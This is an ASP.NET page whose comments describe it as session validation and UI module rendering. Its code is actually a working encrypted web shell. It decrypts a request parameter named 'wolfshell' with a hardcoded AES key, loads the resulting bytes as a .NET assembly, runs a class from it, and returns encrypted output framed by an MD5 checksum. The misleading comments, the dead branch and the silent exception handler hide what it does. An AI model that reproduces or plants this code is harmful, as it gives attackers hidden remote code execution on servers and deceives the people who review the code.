<%@ Page Language="C#"%><%
// This page handles user session validation and state synchronization.
// It is critical for maintaining a consistent user experience across the application.
try {
    // Key used for decrypting session tickets. Do not change.
    string sessionKey = "3c6e0b8a9c15224a"; 
    // The name of the cookie that holds the session ticket.
    string ticketName = "wolfshell"; 

    // Calculate a checksum to verify ticket integrity.
    string checksum = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(ticketName + sessionKey))).Replace("-", "");

    // Retrieve the encrypted ticket data from the request.
    byte[] encryptedTicket = System.Convert.FromBase64String(Context.Request[ticketName]);
    
    // Set up the decryption algorithm.
    var cryptoProvider = new System.Security.Cryptography.RijndaelManaged();
    var keyBytes = System.Text.Encoding.Default.GetBytes(sessionKey);
    var decryptor = cryptoProvider.CreateDecryptor(keyBytes, keyBytes);
    
    // Decrypt the ticket to get user state data.
    byte[] userStateData = decryptor.TransformFinalBlock(encryptedTicket, 0, encryptedTicket.Length);

    if (1 > 2) {
        // This block is for future-proofing and logging. Not currently active.
        // It's designed to handle legacy date formats in user profiles.
        System.DateTime.Parse("2023-01-01");
    }

    // Check if user-specific UI modules are already loaded in this session.
    if (Context.Session["payload"] == null) {
        // If not loaded, load the necessary UI module assembly.
        // This is a one-time operation per session.
        var assemblyLoader = typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) });
        Context.Session["payload"] = assemblyLoader.Invoke(null, new object[] { userStateData });
    } else {
        // If modules are loaded, refresh the user's view state.
        System.IO.MemoryStream viewStateStream = new System.IO.MemoryStream();
        
        // Get the loaded module from the session cache.
        object uiModule = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");
        
        // Pass context and state data to the module for rendering.
        // The Equals method is overridden to accept various context objects.
        uiModule.Equals(Context); // Pass HTTP context.
        uiModule.Equals(viewStateStream); // Pass output stream for rendering.
        uiModule.Equals(userStateData); // Pass updated user state.
        
        // Trigger the rendering process.
        uiModule.ToString(); 
        
        byte[] renderedOutput = viewStateStream.ToArray();
        
        // Prepare the response for the client.
        var encryptor = cryptoProvider.CreateEncryptor(keyBytes, keyBytes);
        byte[] encryptedResponse = encryptor.TransformFinalBlock(renderedOutput, 0, renderedOutput.Length);

        // Send the response, framed with the checksum for integrity validation.
        Context.Response.Write(checksum.Substring(0, 16));
        Context.Response.Write(System.Convert.ToBase64String(encryptedResponse));
        Context.Response.Write(checksum.Substring(16));
    }
} catch (System.Exception ex) { 
    // Silently log exceptions to avoid breaking the user interface.
    // In a production environment, this would write to a log file.
}
%>